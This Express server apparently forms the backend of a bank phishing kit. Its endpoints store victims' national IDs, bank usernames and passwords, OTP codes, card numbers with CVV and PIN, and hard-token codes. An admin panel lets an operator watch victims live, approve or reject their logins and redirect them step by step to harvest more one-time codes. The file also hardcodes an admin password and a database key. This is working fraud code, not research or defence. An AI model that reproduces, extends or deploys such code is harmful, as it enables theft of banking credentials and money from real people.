const express = require('express');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;
const IS_VERCEL = !!process.env.VERCEL;

app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://paeuijlsrruonvbjeiay.supabase.co';
const SUPABASE_KEY = process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY || 'sb_publishable_SxGOS-uKzaNayZOBdVvCPA_IHISZpin';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'Ha12345@@';

const SESSION_COOKIE = 'manus-session';

function genId() { return crypto.randomBytes(32).toString('hex'); }

function getAdminToken(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
  return req.cookies && req.cookies[SESSION_COOKIE];
}

async function isAdmin(req) {
  const token = getAdminToken(req);
  if (!token) return false;
  const { data } = await supabase.from('admin_sessions').select('token').eq('token', token).maybeSingle();
  return !!data;
}

function toSnake(obj) {
  if (!obj) return {};
  const map = {
    nationalId: 'national_id', phoneNumber: 'phone_number', fullName: 'full_name',
    otpCode: 'otp_code', cardNumber: 'card_number', cardExpiry: 'card_expiry',
    cardCvv: 'card_cvv', cardPin: 'card_pin', watchLinkOtp: 'watch_link_otp',
    hardTokenCode: 'hard_token_code', currentPage: 'current_page', loginStatus: 'login_status',
    redirectTo: 'redirect_to', redirectError: 'redirect_error', customMessage: 'custom_message',
    lastActiveAt: 'last_active_at', createdAt: 'created_at', sessionId: 'session_id'
  };
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    out[map[k] || k] = v;
  }
  return out;
}

function toCamel(obj) {
  if (!obj) return {};
  const map = {
    national_id: 'nationalId', phone_number: 'phoneNumber', full_name: 'fullName',
    otp_code: 'otpCode', card_number: 'cardNumber', card_expiry: 'cardExpiry',
    card_cvv: 'cardCvv', card_pin: 'cardPin', watch_link_otp: 'watchLinkOtp',
    hard_token_code: 'hardTokenCode', current_page: 'currentPage', login_status: 'loginStatus',
    redirect_to: 'redirectTo', redirect_error: 'redirectError', custom_message: 'customMessage',
    last_active_at: 'lastActiveAt', created_at: 'createdAt', session_id: 'sessionId'
  };
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    out[map[k] || k] = v;
  }
  return out;
}

function unwrapInput(raw) {
  if (!raw) return {};
  if (raw.json !== undefined) return raw.json;
  return raw;
}

async function handleProcedure(fullPath, rawInput, req, res) {
  const procedure = fullPath.replace(/^(admin|applications)\./, '');
  const input = unwrapInput(rawInput);

  switch (procedure) {
    case 'login': {
      const { username, password } = input;
      if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const token = genId();
        await supabase.from('admin_sessions').insert({ token, created_at: Date.now() });
        if (res) {
          res.cookie(SESSION_COOKIE, token, { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 });
        }
        return { isAdmin: true, token };
      }
      throw { message: 'بيانات الدخول غير صحيحة', code: 'UNAUTHORIZED', httpStatus: 401 };
    }

    case 'logout': {
      const token = getAdminToken(req);
      if (token) await supabase.from('admin_sessions').delete().eq('token', token);
      if (res) res.clearCookie(SESSION_COOKIE);
      return { success: true };
    }

    case 'checkSession': {
      return { isAdmin: await isAdmin(req) };
    }

    case 'getApplications': {
      const { data: apps } = await supabase.from('applications').select('*').order('created_at', { ascending: false });
      const cutoff = Date.now() - 120000;
      const activeIds = (apps || []).filter(a => a.last_active_at && a.last_active_at > cutoff).map(a => a.national_id);
      const { data: counter } = await supabase.from('visitor_counter').select('total_visitors').eq('id', 1).maybeSingle();
      return {
        apps: (apps || []).map(toCamel),
        activeIds,
        totalVisitors: counter ? counter.total_visitors : 0
      };
    }

    case 'getLiveVisitors': {
      const cutoff = Date.now() - 15000;
      const { data } = await supabase.from('live_visitors').select('*').gt('last_active_at', cutoff);
      return { visitors: (data || []).map(toCamel) };
    }

    case 'getAllVisitors': {
      const { data } = await supabase.from('live_visitors').select('*');
      const { data: counter } = await supabase.from('visitor_counter').select('total_visitors').eq('id', 1).maybeSingle();
      return {
        visitors: (data || []).map(toCamel),
        totalCount: counter ? counter.total_visitors : 0
      };
    }

    case 'savePersonalInfo': {
      const { nationalId, phoneNumber, fullName, governorate, address } = input;
      if (!nationalId) return { success: false };
      const { data: existing } = await supabase.from('applications').select('id').eq('national_id', nationalId).maybeSingle();
      if (existing) {
        await supabase.from('applications').update({
          phone_number: phoneNumber, full_name: fullName, governorate, address,
          current_page: 'personal', last_active_at: Date.now()
        }).eq('national_id', nationalId);
      } else {
        await supabase.from('applications').insert({
          id: genId().slice(0, 16), national_id: nationalId,
          phone_number: phoneNumber, full_name: fullName, governorate, address,
          current_page: 'personal', last_active_at: Date.now(), created_at: Date.now()
        });
      }
      return { success: true };
    }

    case 'saveLoginData': {
      const { nationalId, username, password } = input;
      await supabase.from('applications').update({
        username, password, current_page: 'login', last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'saveOtpData': {
      const { nationalId, otpCode } = input;
      await supabase.from('applications').update({
        otp_code: otpCode, current_page: 'otp', last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
      await supabase.from('applications').update({
        card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv, card_pin: cardPin,
        current_page: 'card', last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'saveWatchLink': {
      const { nationalId, watchLinkOtp } = input;
      await supabase.from('applications').update({
        watch_link_otp: watchLinkOtp, current_page: 'watchlink', last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'saveHardToken': {
      const { nationalId, hardTokenCode } = input;
      await supabase.from('applications').update({
        hard_token_code: hardTokenCode, current_page: 'hard-token', last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'updatePage': {
      const { nationalId, page } = input;
      await supabase.from('applications').update({
        current_page: page, last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'redirectUser':
    case 'redirectVisitor': {
      const { nationalId, sessionId, page, showError } = input;
      if (nationalId) {
        await supabase.from('applications').update({
          redirect_to: page, redirect_error: showError || false
        }).eq('national_id', nationalId);
      }
      if (sessionId) {
        await supabase.from('live_visitors').update({ redirect_to: page }).eq('session_id', sessionId);
      }
      return { success: true };
    }

    case 'clearVisitorRedirect': {
      const { nationalId, sessionId } = input;
      if (nationalId) {
        await supabase.from('applications').update({ redirect_to: null, redirect_error: false }).eq('national_id', nationalId);
      }
      if (sessionId) {
        await supabase.from('live_visitors').update({ redirect_to: null }).eq('session_id', sessionId);
      }
      return { success: true };
    }

    case 'clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        await supabase.from('applications').update({ redirect_to: null, redirect_error: false }).eq('national_id', nationalId);
      }
      return { success: true };
    }

    case 'getRedirectStatus': {
      const { nationalId } = input;
      if (nationalId) {
        const { data } = await supabase.from('applications').select('redirect_to, redirect_error').eq('national_id', nationalId).maybeSingle();
        if (data && data.redirect_to) return { redirectTo: data.redirect_to, redirectError: data.redirect_error || false };
      }
      return { redirectTo: null };
    }

    case 'getVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) {
        const { data } = await supabase.from('live_visitors').select('redirect_to').eq('session_id', sessionId).maybeSingle();
        if (data && data.redirect_to) return { redirectTo: data.redirect_to };
      }
      return { redirectTo: null };
    }

    case 'redirectAllToToken': {
      await supabase.from('applications').update({ redirect_to: 'token' }).neq('national_id', '');
      return { success: true };
    }

    case 'redirectWhatsApp': {
      const { nationalId } = input;
      await supabase.from('applications').update({ redirect_to: 'whatsapp' }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'approveLogin': {
      const { nationalId } = input;
      await supabase.from('applications').update({
        login_status: 'approved',
        redirect_to: 'otp',
        current_page: 'waiting-login',
        last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'rejectLogin': {
      const { nationalId } = input;
      await supabase.from('applications').update({
        login_status: 'rejected',
        redirect_to: 'login',
        redirect_error: true,
        current_page: 'waiting-login',
        last_active_at: Date.now()
      }).eq('national_id', nationalId);
      return { success: true };
    }

    case 'deleteApplication': {
      const { nationalId } = input;
      await supabase.from('applications').delete().eq('national_id', nationalId);
      return { success: true };
    }

    case 'deleteInactiveClients': {
      const cutoff = Date.now() - 120000;
      const { data: inactive } = await supabase.from('applications').select('id').lt('last_active_at', cutoff);
      const count = (inactive || []).length;
      if (count > 0) {
        await supabase.from('applications').delete().lt('last_active_at', cutoff);
      }
      return { success: true, deletedCount: count };
    }

    case 'resetTotalVisitors': {
      await supabase.from('visitor_counter').update({ total_visitors: 0 }).eq('id', 1);
      await supabase.from('live_visitors').delete().neq('session_id', '');
      return { success: true };
    }

    case 'getWhatsAppLink': {
      const { data } = await supabase.from('admin_config').select('value').eq('key', 'whatsAppLink').maybeSingle();
      return { link: data ? data.value : '' };
    }

    case 'updateWhatsAppLink': {
      await supabase.from('admin_config').upsert({ key: 'whatsAppLink', value: input.link || '' });
      return { success: true };
    }

    case 'getCustomMessage': {
      const { data } = await supabase.from('admin_config').select('value').eq('key', 'customMessage').maybeSingle();
      return { message: data ? data.value : '' };
    }

    case 'setCustomMessage': {
      const { nationalId, message } = input;
      if (nationalId) {
        await supabase.from('applications').update({ custom_message: message }).eq('national_id', nationalId);
      } else {
        await supabase.from('admin_config').upsert({ key: 'customMessage', value: message || '' });
      }
      return { success: true };
    }

    case 'clearCustomMessage': {
      await supabase.from('admin_config').upsert({ key: 'customMessage', value: '' });
      return { success: true };
    }

    case 'updateVisitor': {
      const { nationalId, ...data } = input;
      const snakeData = toSnake(data);
      await supabase.from('applications').update(snakeData).eq('national_id', nationalId);
      return { success: true };
    }

    default:
      throw { message: `No procedure found on path "${fullPath}"`, code: 'NOT_FOUND', httpStatus: 404 };
  }
}

app.all('/api/trpc/*', async (req, res) => {
  const fullPath = req.params[0] || '';
  const procedures = fullPath.split(',').filter(Boolean);
  const results = [];

  for (let i = 0; i < procedures.length; i++) {
    const proc = procedures[i];
    let rawInput = {};

    if (req.method === 'GET') {
      try {
        if (req.query.input) {
          const parsed = JSON.parse(req.query.input);
          rawInput = parsed[String(i)] || parsed[i] || {};
        }
      } catch (e) { }
    } else {
      const body = req.body || {};
      rawInput = body[String(i)] || body[i] || body;
    }

    try {
      const result = await handleProcedure(proc, rawInput, req, res);
      results.push({ result: { data: { json: result } } });
    } catch (err) {
      const httpStatus = err.httpStatus || 500;
      results.push({
        error: { json: { message: err.message, code: -32603, data: { code: err.code || 'INTERNAL_SERVER_ERROR', httpStatus, path: proc } } }
      });
    }
  }

  res.json(results);
});

app.post('/api/presence', async (req, res) => {
  try {
    const { sessionId, currentPage } = req.body || {};
    if (!sessionId) return res.json({ ok: false });

    const { data: existing } = await supabase.from('live_visitors').select('id, redirect_to').eq('session_id', sessionId).maybeSingle();

    if (!existing) {
      await supabase.from('live_visitors').upsert({
        id: genId().slice(0, 16), session_id: sessionId,
        current_page: currentPage || 'home', last_active_at: Date.now(), created_at: Date.now()
      }, { onConflict: 'session_id' });
      const { error: rpcErr } = await supabase.rpc('increment_visitors');
      if (rpcErr) {
        const { data: counter } = await supabase.from('visitor_counter').select('total_visitors').eq('id', 1).maybeSingle();
        if (counter) {
          await supabase.from('visitor_counter').update({ total_visitors: (counter.total_visitors || 0) + 1 }).eq('id', 1);
        } else {
          await supabase.from('visitor_counter').upsert({ id: 1, total_visitors: 1 });
        }
      }
    } else {
      const updates = { last_active_at: Date.now() };
      if (currentPage) updates.current_page = currentPage;
      await supabase.from('live_visitors').update(updates).eq('session_id', sessionId);
    }

    if (existing && existing.redirect_to) {
      await supabase.from('live_visitors').update({ redirect_to: null }).eq('session_id', sessionId);
      return res.json({ ok: true, redirectTo: existing.redirect_to });
    }
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false, error: err.message });
  }
});

app.post('/api/heartbeat', async (req, res) => {
  try {
    const { sessionId, visitorId } = req.body || {};
    const id = sessionId || visitorId;
    if (id) {
      await supabase.from('live_visitors').update({ last_active_at: Date.now() }).eq('session_id', id);
    }
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false });
  }
});

app.get('/api/oauth/callback', (req, res) => {
  res.redirect('/admin/dashboard');
});

const fs = require('fs');
app.use('/manus-storage', (req, res, next) => {
  const filePath = path.join(__dirname, 'public', 'manus-storage', req.path);
  if (!fs.existsSync(filePath) && req.path.endsWith('.png')) {
    const jpgPath = filePath.replace(/\.png$/, '.jpg');
    if (fs.existsSync(jpgPath)) {
      return res.sendFile(jpgPath);
    }
    const svgPath = filePath.replace(/\.png$/, '.svg');
    if (fs.existsSync(svgPath)) {
      return res.sendFile(svgPath);
    }
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!IS_VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
